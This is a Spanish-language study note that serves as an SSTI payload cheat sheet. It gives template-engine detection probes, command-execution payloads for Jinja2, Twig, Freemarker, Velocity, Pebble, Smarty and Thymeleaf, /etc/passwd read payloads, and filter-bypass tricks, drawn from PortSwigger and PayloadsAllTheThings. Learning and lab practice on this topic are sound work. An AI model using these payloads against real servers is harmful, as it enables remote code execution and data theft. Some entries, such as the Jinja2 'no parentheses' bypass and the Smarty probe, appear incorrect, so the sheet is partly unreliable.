---
title: "SSTI — Server-Side Template Injection"
type: note
status: active
tags:
  - seguridad
  - web
  - ssti
  - vulnerabilidades
aliases:
  - Server-Side Template Injection
  - SSTI
created: 2026-06-13
updated: 2026-06-13
---

# SSTI — Server-Side Template Injection

> [!INFO] Fuente
> PortSwigger SSTI, PayloadsAllTheThings.

---

## Deteccion por motor de templates

```html
{{7*7}}         → 49  → Jinja2, Twig, Nunjucks, Liquid
${7*7}          → 49  → Freemarker, Velocity
#{7*7}          → 49  → Pebble
*{7*7}          → 49  → Thymeleaf (Spring)
{{7*'7'}}       → 777 → Jinja2 (multiplicacion de strings)
{{7*'7'}}       → 49  → Twig (type error o conversion)
<%= 7*7 %>      → 49  → ERB (Ruby)
${{7*7}}        → 49  → Smarty (PHP)
{{7*7}}         → 49  → Blade (Laravel) — si no hay raw
```

---

## Explotacion por motor

### Jinja2 (Python)

```python
# RCE basico
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Subprocess
{{ lipsum.__globals__["os"].popen("id").read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# File read
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}
```

### Twig (PHP)

```php
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}

{{ ['id'] | filter('system') }}

# File read
{{ '/etc/passwd' | file_excerpt(1,30) }}
```

### Freemarker (Java)

```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id") }

<#--
# RCE via api
${"freemarker.template.utility.Execute"?new()("id")}
-->

# File read
${"freemarker.template.utility.ObjectConstructor"?new()("java.util.Scanner", "freemarker.template.utility.ObjectConstructor"?new()("java.io.File", "/etc/passwd")).useDelimiter("\\Z").next()}
```

### Velocity (Java)

```java
#set ($str = "")
#set ($ex = $str.getClass().forName("java.lang.Runtime"))
#set ($rt = $ex.getRuntime())
$rt.exec("id")

# File read
#set ($str = "")
#set ($file = $str.getClass().forName("java.io.File"))
#set ($reader = $str.getClass().forName("java.io.FileReader"))
$reader.newInstance($file.newInstance("/etc/passwd"))
```

### Pebble (Java)

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
```

### Smarty (PHP)

```php
{system('id')}
{php}echo shell_exec('id');{/php}
{exec('id')}
```

### Thymeleaf (Spring)

```html
<!-- En un atributo HTML -->
<p th:text="${T(java.lang.Runtime).getRuntime().exec('id')}">test</p>
```

---

## Bypass de restricciones

### Sin parentesis (cuando estan bloqueados)

```python
# Jinja2 sin parentesis
{{ config.__class__.__init__.__globals__.__builtins__.__import__['os'].popen['id'] }}
```

### Sin puntos

```python
# Jinja2 con [] en vez de .
{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
```

### Sin doble underscore

```python
# A veces __ estan bloqueados
# Usar |attr filter
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
```

---

## Lab PortSwigger

```
PortSwigger SSTI labs:
  https://portswigger.net/web-security/server-side-template-injection
```

---

## Ver tambien

- [[SEGURIDAD/Vulnerabilidades Web]]
- [[SEGURIDAD/SQL Injection]]
- [[SEGURIDAD/00 - INDICE]]
